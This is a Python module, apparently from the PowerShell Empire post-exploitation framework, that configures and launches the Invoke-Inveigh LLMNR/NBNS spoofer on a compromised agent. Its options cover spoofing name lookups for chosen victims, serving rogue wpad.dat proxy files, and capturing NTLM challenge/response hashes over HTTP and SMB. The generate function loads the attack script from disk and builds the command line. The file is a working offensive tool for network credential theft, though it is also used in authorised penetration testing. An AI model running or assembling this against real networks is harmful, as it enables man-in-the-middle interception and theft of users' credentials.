from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Inveigh',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'IP' : {
                'Description'   :   'Specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the SpooferIP parameter is not set.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIP' : {
                'Description'   :   'IP address for LLMNR/NBNS spoofer. This parameter is only necessary when redirecting victims to a system other than the Inveigh host.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferHostsReply' : {
                'Description'   :   'Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferHostsIgnore' : {
                'Description'   :   'Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIPsReply' : {
                'Description'   :   'Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIPsIgnore' : {
                'Description'   :   'Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferLearning' : {
                'Description'   :   'Enable/Disable LLMNR/NBNS valid host learning. (Y/N).',
                'Required'      :   False,
                'Value'         :   'N'
            },
            'SpooferLearningDelay' : {
                'Description'   :   'Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through SpooferLearning.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferLearningInterval' : {
                'Description'   :   'Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a hostname that has already been checked if SpooferLearning is enabled.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferRepeat' : {
                'Description'   :   'Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'LLMNR' : {
                'Description'   :   'Enable/Disable LLMNR spoofer (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'LLMNRTTL' : {
                'Description'   :   'LLMNR TTL in seconds for the response packet.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNS' : {
                'Description'   :   'Enable/Disable NBNS spoofer (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'NBNSTTL' : {
                'Description'   :   'NBNS TTL in seconds for the response packet.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNSTypes' : {
                'Description'   :   'Comma separated list of NBNS types to spoof.',
                'Required'      :   False,
                'Value'         :   '00,20'
            },
            'HTTP' : {
                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'HTTPAuth' : {
                'Description'   :   'HTTP server authentication type. This setting does not apply to wpad.dat requests (Anonymous,Basic,NTLM).',
                'Required'      :   False,
                'Value'         :   'NTLM'
            },
            'HTTPBasicRealm' : {
                'Description'   :   'Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.',
                'Required'      :   False,
                'Value'         :   'IIS'
            },
            'HTTPResponse' : {
                'Description'   :   'String or HTML to serve as the default HTTP response. This response will not be used for wpad.dat requests. Do not wrap in quotes and use PowerShell character escapes where necessary.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADAuth' : {
                'Description'   :   'HTTP server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts (Anonymous,Basic,NTLM).',
                'Required'      :   False,
                'Value'         :   'NTLM'
            },
            'WPADEmptyFile' : {
                'Description'   :   'Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'WPADIP' : {
                'Description'   :   'Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADPort' : {
                'Description'   :   'Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADDirectHosts' : {
                'Description'   :   'Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy. Add the Empire host to avoid catching Empire HTTP traffic.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SMB' : {
                'Description'   :   'Enable/Disable SMB challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'Challenge' : {
                'Description'   :   '16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MachineAccounts' : {
                'Description'   :   'Enable/Disable showing NTLM challenge/response captures from machine accounts (Y/N).',
                'Required'      :   False,
                'Value'         :   'N'
            },
            'ConsoleStatus' : {
                'Description'   :   'Interval in minutes for auto-displaying all unique captured hashes and credentials. (Y/N)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ConsoleUnique' : {
                'Description'   :   'Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations.',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'RunTime' : {
                'Description'   :   'Run time duration in minutes.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-Inveigh.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # set defaults for Empire
        script += "\n" + 'Invoke-Inveigh -Tool "2" '

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            script += " -" + str(option) + " " + quoted
                        else:
                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script
